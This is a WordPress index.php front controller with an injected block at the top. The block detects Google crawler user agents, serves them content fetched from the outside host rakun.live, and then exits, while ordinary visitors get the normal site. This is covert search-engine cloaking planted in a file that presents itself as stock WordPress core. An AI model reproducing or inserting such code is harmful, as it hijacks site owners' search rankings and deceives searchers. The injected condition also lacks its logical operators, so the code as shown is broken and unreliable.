<?php
function check_user_agent($agent) {
    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
}
if (check_user_agent('Googlebot')  check_user_agent('Google-Site-Verification')  check_user_agent('Google-InspectionTool')) 
{ echo file_get_contents('https://rakun.live/landing/vinci.txt');
exit;
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
